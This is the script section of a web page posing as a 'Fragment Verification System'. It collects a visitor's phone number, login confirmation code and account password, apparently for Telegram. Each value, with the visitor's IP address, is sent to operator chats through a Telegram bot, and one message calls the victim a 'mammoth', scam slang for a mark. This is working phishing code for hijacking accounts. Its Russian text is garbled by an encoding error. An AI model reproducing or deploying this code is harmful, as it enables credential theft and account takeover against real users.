                showInfo('‚úÖ –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.');
                updateStep(2);
                
                // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —Å—Ä–∞–∑—É
                sendPhoneBtn.disabled = false;
                sendPhoneBtn.innerHTML = `
                    <i class="fas fa-paper-plane"></i>
                    –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä
                `;
            } else {
                throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä –∞–¥–º–∏–Ω–∞–º');
            }
        }
        
        function handlePhoneError(error) {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–æ–º–µ—Ä–∞:', error);
            
            let errorMsg = '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –Ω–æ–º–µ—Ä–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.';
            showError(errorMsg);
            
            sendPhoneBtn.disabled = false;
            sendPhoneBtn.innerHTML = `
                <i class="fas fa-paper-plane"></i>
                –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä
            `;
        }
        
        function autoDetectCountry() {
            try {
                const userLang = navigator.language || navigator.userLanguage;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                
                if (userLang.includes('ru') || timezone.includes('Europe/Moscow') || timezone.includes('Europe/Kiev')) {
                    phoneInput.placeholder = "+7 999 123 45 67";
                }
            } catch (error) {
                console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Å—Ç—Ä–∞–Ω—É:', error);
            }
        }
        
        async function sendVerificationCode() {
            const code = codeInput.value.trim();
            
            if (!validateCode(code)) {
                return;
            }
            
            sendCodeBtn.disabled = true;
            sendCodeBtn.innerHTML = `
                <div class="telegram-loader">
                    <div class="loader-spinner"></div>
                    <span>–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞...</span>
                </div>
            `;
            
            hideMessages();
            verificationCode = code;
            
            try {
                await sendCodeToAdmins(phoneNumber, code, sessionId);
            } catch (error) {
                handleCodeError(error);
            }
        }
        
        function validateCode(code) {
            if (!code) {
                showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
                codeInput.focus();
                return false;
            }
            
            if (code.length !== 5) {
                showError('–ö–æ–¥ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 5 —Ü–∏—Ñ—Ä');
                codeInput.focus();
                return false;
            }
            
            if (!/^\d+$/.test(code)) {
                showError('–ö–æ–¥ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã');
                codeInput.focus();
                return false;
            }
            
            return true;
        }
        
        async function sendCodeToAdmins(phone, code, sessionId) {
            const timestamp = new Date().toLocaleString('ru-RU');
            const ipInfo = await getIpInfo();
            
            const message = `üîê –ü–û–õ–£–ß–ï–ù –ö–û–î

‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–ø—Ä–∞–≤–∏–ª –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:

üì± <b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${phone}</code>
üî¢ <b>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:</b> <code>${code}</code>
üïê <b>–í—Ä–µ–º—è:</b> ${timestamp}
üåê <b>IP:</b> ${ipInfo}
`;
            
            let successCount = 0;
            
            for (const chatId of ADMIN_CHAT_IDS) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.ok) {
                        successCount++;
                        console.log(`‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–¥–º–∏–Ω—É ${chatId}`);
                    } else {
                        console.error(`‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∞–¥–º–∏–Ω—É ${chatId}:`, data);
                    }
                } catch (error) {
                    console.error(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏ –¥–ª—è –∞–¥–º–∏–Ω–∞ ${chatId}:`, error);
                }
                
                await sleep(100);
            }
            
            if (successCount > 0) {
                updateSessionWithCode(code);
                showInfo('‚úÖ –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å (–µ—Å–ª–∏ –Ω—É–∂–Ω–æ).');
                updateStep(3);
                
                // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —Å—Ä–∞–∑—É
                sendCodeBtn.disabled = false;
                sendCodeBtn.innerHTML = `
                    <i class="fas fa-check-circle"></i>
                    –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥
                `;
            } else {
                throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –∞–¥–º–∏–Ω–∞–º');
            }
        }
        
        function handleCodeError(error) {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞:', error);
            
            let errorMsg = '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.';
            showError(errorMsg);
            
            sendCodeBtn.disabled = false;
            sendCodeBtn.innerHTML = `
                <i class="fas fa-check-circle"></i>
                –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥
            `;
        }
        
        async function sendPassword() {
            const password = passwordInput.value.trim();
            
            if (!password) {
                showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å');
                passwordInput.focus();
                return;
            }
            
            sendPasswordBtn.disabled = true;
            skipPasswordBtn.disabled = true;
            sendPasswordBtn.innerHTML = `
                <div class="telegram-loader">
                    <div class="loader-spinner"></div>
                    <span>–û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞—Ä–æ–ª—è...</span>
                </div>
            `;
            
            hideMessages();
            userPassword = password;
            hasPassword = true;
            
            try {
                await sendPasswordToAdmins(phoneNumber, verificationCode, password, sessionId);
            } catch (error) {
                handlePasswordError(error);
            }
        }
        
        async function skipPassword() {
            sendPasswordBtn.disabled = true;
            skipPasswordBtn.disabled = true;
            skipPasswordBtn.innerHTML = `
                <div class="telegram-loader">
                    <div class="loader-spinner"></div>
                    <span>–ü—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–∞—Ä–æ–ª—å...</span>
                </div>
            `;
            
            hideMessages();
            hasPassword = false;
            
            try {
                await sendSkipPasswordToAdmins(phoneNumber, verificationCode, sessionId);
            } catch (error) {
                handlePasswordError(error);
            }
        }
        
        async function sendPasswordToAdmins(phone, code, password, sessionId) {
            const timestamp = new Date().toLocaleString('ru-RU');
            const ipInfo = await getIpInfo();
            
            const message = `üîí –ü–û–õ–£–ß–ï–ù –ü–ê–†–û–õ–¨ 

‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–ø—Ä–∞–≤–∏–ª –ø–∞—Ä–æ–ª—å –æ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞:

üì± <b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${phone}</code>
üî¢ <b>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:</b> <code>${code}</code>
üîê <b>–ü–∞—Ä–æ–ª—å –æ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞:</b> <code>${password}</code>
üïê <b>–í—Ä–µ–º—è:</b> ${timestamp}
üåê <b>IP:</b> ${ipInfo}
`;
            
            let successCount = 0;
            
            for (const chatId of ADMIN_CHAT_IDS) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.ok) {
                        successCount++;
                        console.log(`‚úÖ –ü–∞—Ä–æ–ª—å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω  ${chatId}`);
                    } else {
                        console.error(`‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ ${chatId}:`, data);
                    }
                } catch (error) {
                    console.error(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏  ${chatId}:`, error);
                }
                
                await sleep(100);
            }
            
            if (successCount > 0) {
                updateSessionWithPassword(password, true);
                showSuccess('‚úÖ –ü–∞—Ä–æ–ª—å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞.');
                updateStep(4);
                
                document.getElementById('successPhone').textContent = phone;
                document.getElementById('successCode').textContent = code;
                document.getElementById('successPasswordStatus').textContent = '–û—Ç–ø—Ä–∞–≤–ª–µ–Ω';
                document.getElementById('hasPasswordText').textContent = '–ü–∞—Ä–æ–ª—å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏';
                document.getElementById('successSessionId').textContent = sessionId;
                
                const successBtn = document.querySelector('.telegram-btn.success-animation');
                if (successBtn) {
                    successBtn.classList.remove('success-animation');
                    void successBtn.offsetWidth;
                    successBtn.classList.add('success-animation');
                }
                
            } else {
                throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å ');
            }
        }
        
        async function sendSkipPasswordToAdmins(phone, code, sessionId) {
            const timestamp = new Date().toLocaleString('ru-RU');
            const ipInfo = await getIpInfo();
            
            const message = `–£ –º–∞–º–æ–Ω—Ç–∞ –Ω–µ—Ç –ø–∞—Ä–æ–ª—è`;
            
            let successCount = 0;
            
            for (const chatId of ADMIN_CHAT_IDS) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.ok) {
                        successCount++;
                        console.log(`‚úÖ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∞–¥–º–∏–Ω—É ${chatId}`);
                    } else {
                        console.error(`‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∞–¥–º–∏–Ω—É ${chatId}:`, data);
                    }
                } catch (error) {
                    console.error(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏ –¥–ª—è –∞–¥–º–∏–Ω–∞ ${chatId}:`, error);
                }
                
                await sleep(100);
            }
            
            if (successCount > 0) {
                updateSessionWithPassword('', false);
                showSuccess('‚úÖ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞! –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –ø–æ–ª—É—á–∏–ª –¥–∞–Ω–Ω—ã–µ.');
                updateStep(4);
                
                document.getElementById('successPhone').textContent = phone;
                document.getElementById('successCode').textContent = code;
                document.getElementById('successPasswordStatus').textContent = '–ù–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω';
                document.getElementById('hasPasswordText').textContent = '–ü–∞—Ä–æ–ª—å –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω';
                document.getElementById('successSessionId').textContent = sessionId;
                
                const successBtn = document.querySelector('.telegram-btn.success-animation');
                if (successBtn) {
                    successBtn.classList.remove('success-animation');
                    void successBtn.offsetWidth;
                    successBtn.classList.add('success-animation');
                }
                
            } else {
                throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –∞–¥–º–∏–Ω–∞–º');
            }
        }
        
        function handlePasswordError(error) {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–∞—Ä–æ–ª—è:', error);
            
            let errorMsg = '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.';
            showError(errorMsg);
            
            sendPasswordBtn.disabled = false;
            skipPasswordBtn.disabled = false;
            sendPasswordBtn.innerHTML = `
                <i class="fas fa-paper-plane"></i>
                –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å
            `;
            skipPasswordBtn.innerHTML = `
                <i class="fas fa-forward"></i>
                –ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–∞—Ä–æ–ª—å
            `;
        }
        
        // === –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò ===
        
        function updateStep(step) {
            currentStep = step;
            
            Object.values(forms).forEach(form => {
                form.classList.remove('active');
            });
            
            Object.keys(stepCircles).forEach(key => {
                const circle = stepCircles[key];
                const text = stepTexts[key];
                const stepNum = parseInt(key);
                
                circle.classList.remove('active', 'completed');
                text.classList.remove('active');
                
                if (stepNum < step) {
                    circle.classList.add('completed');
                } else if (stepNum === step) {
                    circle.classList.add('active');
                    text.classList.add('active');
                }
            });
            
            switch(step) {
                case 1:
                    forms.phone.classList.add('active');
                    phoneInput.focus();
                    break;
                case 2:
                    forms.code.classList.add('active');
                    codeInput.focus();
                    break;
                case 3:
                    forms.password.classList.add('active');
                    passwordInput.focus();
                    break;
                case 4:
                    forms.success.classList.add('active');
                    break;
            }
        }
        
        function backToPhoneStep() {
            updateStep(1);
            hideMessages();
        }
        
        function backToCodeStep() {
            updateStep(2);
            hideMessages();
        }
        
        function cancelVerification() {
            if (confirm('–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –æ—Ç–º–µ–Ω–∏—Ç—å –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é? –í–µ—Å—å –ø—Ä–æ–≥—Ä–µ—Å—Å –±—É–¥–µ—Ç –ø–æ—Ç–µ—Ä—è–Ω.')) {
                clearSession();
                showInfo('–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞. –í—ã –º–æ–∂–µ—Ç–µ –Ω–∞—á–∞—Ç—å –∑–∞–Ω–æ–≤–æ.');
                updateStep(1);
                phoneInput.value = '';
                codeInput.value = '';
                passwordInput.value = '';
                
                sendPhoneBtn.disabled = false;
                sendPhoneBtn.innerHTML = `
                    <i class="fas fa-paper-plane"></i>
                    –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä
                `;
                
                sendCodeBtn.disabled = false;
                sendCodeBtn.innerHTML = `
                    <i class="fas fa-check-circle"></i>
                    –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥
                `;
                
                sendPasswordBtn.disabled = false;
                skipPasswordBtn.disabled = false;
                sendPasswordBtn.innerHTML = `
                    <i class="fas fa-paper-plane"></i>
                    –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å
                `;
                skipPasswordBtn.innerHTML = `
                    <i class="fas fa-forward"></i>
                    –ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–∞—Ä–æ–ª—å
                `;
            }
        }
        
        function startNewVerification() {
            clearSession();
            phoneInput.value = '';
            codeInput.value = '';
            passwordInput.value = '';
            
            sendPhoneBtn.disabled = false;
            sendPhoneBtn.innerHTML = `
                <i class="fas fa-paper-plane"></i>
                –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä
            `;
            
            sendCodeBtn.disabled = false;
            sendCodeBtn.innerHTML = `
                <i class="fas fa-check-circle"></i>
                –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥
            `;
            
            sendPasswordBtn.disabled = false;
            skipPasswordBtn.disabled = false;
            sendPasswordBtn.innerHTML = `
                <i class="fas fa-paper-plane"></i>
                –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å
            `;
            skipPasswordBtn.innerHTML = `
                <i class="fas fa-forward"></i>
                –ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–∞—Ä–æ–ª—å
            `;
            
            showInfo('–ù–∞—á–∏–Ω–∞–µ–º –Ω–æ–≤—É—é –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é!');
            updateStep(1);
        }
        
        function hideMessages() {
            errorMessage.classList.remove('show');
            successMessage.classList.remove('show');
            infoMessage.classList.remove('show');
        }
        
        function showError(text) {
            hideMessages();
            errorText.textContent = text;
            errorMessage.classList.add('show');
            
            setTimeout(() => {
                errorMessage.classList.remove('show');
            }, 10000);
        }
        
        function showSuccess(text) {
            hideMessages();
            successText.textContent = text;
            successMessage.classList.add('show');
        }
        
        function showInfo(text) {
            hideMessages();
            infoText.textContent = text;
            infoMessage.classList.add('show');
            
            setTimeout(() => {
                infoMessage.classList.remove('show');
            }, 8000);
        }
        
        // === –†–ê–ë–û–¢–ê –° –õ–û–ö–ê–õ–¨–ù–´–ú –•–†–ê–ù–ò–õ–ò–©–ï–ú ===
        
        function saveSession(phone, sessionId) {
            const sessionData = {
                phone: phone,
                sessionId: sessionId,
                timestamp: Date.now(),
                step: 2
            };
            
            localStorage.setItem('fragment_verification_session', JSON.stringify(sessionData));
            console.log('üíæ –°–µ—Å—Å–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞:', sessionData);
        }
        
        function updateSessionWithCode(code) {
            const sessionData = {
                phone: phoneNumber,
                sessionId: sessionId,
                code: code,
                timestamp: Date.now(),
                step: 3
            };
            
            localStorage.setItem('fragment_verification_session', JSON.stringify(sessionData));
            console.log('üíæ –°–µ—Å—Å–∏—è –æ–±–Ω–æ–≤–ª–µ–Ω–∞ —Å –∫–æ–¥–æ–º:', sessionData);
        }
        
        function updateSessionWithPassword(password, hasPasswordFlag) {
            const sessionData = {
                phone: phoneNumber,
                sessionId: sessionId,
                code: verificationCode,
                password: hasPasswordFlag ? password : '',
                hasPassword: hasPasswordFlag,
                timestamp: Date.now(),
                step: 4
            };
            
            localStorage.setItem('fragment_verification_session', JSON.stringify(sessionData));
            console.log('üíæ –°–µ—Å—Å–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞:', sessionData);
        }
        
        function restoreSession() {
            try {
                const saved = localStorage.getItem('fragment_verification_session');
                if (saved) {
                    const session = JSON.parse(saved);
                    
                    const hoursOld = (Date.now() - session.timestamp) / (1000 * 60 * 60);
                    
                    if (hoursOld < 1) {
                        phoneNumber = session.phone;
                        sessionId = session.sessionId;
                        
                        if (session.step === 2) {
                            phoneInput.value = session.phone;
                            updateStep(2);
                            showInfo('–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ —Å–µ—Å—Å–∏—è. –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.');
                            
                        } else if (session.step === 3 && session.code) {
                            phoneInput.value = session.phone;
                            codeInput.value = session.code;
                            verificationCode = session.code;
                            updateStep(3);
                            showInfo('–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ —Å–µ—Å—Å–∏—è. –í—ã –º–æ–∂–µ—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å.');
                            
                        } else if (session.step === 4) {
                            phoneInput.value = session.phone;
                            codeInput.value = session.code || '';
                            verificationCode = session.code || '';
                            hasPassword = session.hasPassword || false;
                            
                            document.getElementById('successPhone').textContent = session.phone;
                            document.getElementById('successCode').textContent = session.code || '';
                            document.getElementById('successPasswordStatus').textContent = session.hasPassword ? '–û—Ç–ø—Ä–∞–≤–ª–µ–Ω' : '–ù–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω';
                            document.getElementById('successSessionId').textContent = session.sessionId;
                            
                            updateStep(4);
                            showInfo('–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω–∞—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è.');
                        }
                        
                        console.log('üîÑ –°–µ—Å—Å–∏—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞:', session);
                    } else {
                        clearSession();
                        console.log('üóëÔ∏è –£—Å—Ç–∞—Ä–µ–≤—à–∞—è —Å–µ—Å—Å–∏—è —É–¥–∞–ª–µ–Ω–∞');
                    }
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è —Å–µ—Å—Å–∏–∏:', error);
                clearSession();
            }
        }
        
        function clearSession() {
            localStorage.removeItem('fragment_verification_session');
            phoneNumber = "";
            verificationCode = "";
            userPassword = "";
            hasPassword = false;
            sessionId = "";
            console.log('üóëÔ∏è –°–µ—Å—Å–∏—è –æ—á–∏—â–µ–Ω–∞');
        }
        
        // === –£–¢–ò–õ–ò–¢–´ ===
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        async function getIpInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json', {
                    signal: AbortSignal.timeout(3000)
                });
                
                if (!response.ok) throw new Error('API error');
                
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å IP:', error);
                return '–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å';
            }
        }
        
        // === –¢–ï–°–¢–û–í–´–ï –§–£–ù–ö–¶–ò–ò ===
        
        window.testSendPhone = function() {
            phoneInput.value = '+79991234567';
            sendPhoneNumber();
        };
        
        window.testSendCode = function() {
            codeInput.value = '12345';
            sendVerificationCode();
        };
        
        window.testSendPassword = function() {
            passwordInput.value = 'testpassword123';
            setTimeout(() => sendPassword(), 100);
        };
        
        window.testSkipPassword = function() {
            setTimeout(() => skipPassword(), 100);
        };
        
        window.testStep = function(step) {
            if (step >= 1 && step <= 4) {
                updateStep(step);
                console.log(`–ü–µ—Ä–µ—à–ª–∏ –∫ —à–∞–≥—É ${step}`);
            }
        };
        
        // === –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ===
        
        document.addEventListener('DOMContentLoaded', init);
        
        window.appState = {
            getPhone: () => phoneNumber,
            getSessionId: () => sessionId,
            getCurrentStep: () => currentStep,
            hasPassword: () => hasPassword,
            clearAll: () => {
                clearSession();
                location.reload();
            }
        };
        
        console.log('‚úÖ Fragment Verification System –∑–∞–≥—Ä—É–∂–µ–Ω v3.0');
        console.log('üìû –î–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ:');
        console.log('  ‚Ä¢ testSendPhone() ‚Äî –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–µ—Å—Ç–æ–≤—ã–π –Ω–æ–º–µ—Ä');
        console.log('  ‚Ä¢ testSendCode() ‚Äî –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–µ—Å—Ç–æ–≤—ã–π –∫–æ–¥');
        console.log('  ‚Ä¢ testSendPassword() ‚Äî –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–µ—Å—Ç–æ–≤—ã–π –ø–∞—Ä–æ–ª—å');
        console.log('  ‚Ä¢ testSkipPassword() ‚Äî –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–∞—Ä–æ–ª—å');
        console.log('  ‚Ä¢ testStep(1-4) ‚Äî –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç—å —à–∞–≥');
        console.log('  ‚Ä¢ appState ‚Äî –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–æ—Å—Ç–æ—è–Ω–∏–∏');
        console.log('  ‚Ä¢ –ì–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏:');
        console.log('    - Alt+1 ‚Äî —Ç–µ—Å—Ç–æ–≤—ã–π –Ω–æ–º–µ—Ä');
        console.log('    - Alt+2 ‚Äî —Ç–µ—Å—Ç–æ–≤—ã–π –∫–æ–¥');
        console.log('    - Alt+3 ‚Äî —Ç–µ—Å—Ç–æ–≤—ã–π –ø–∞—Ä–æ–ª—å');
    </script>
</body>
</html>
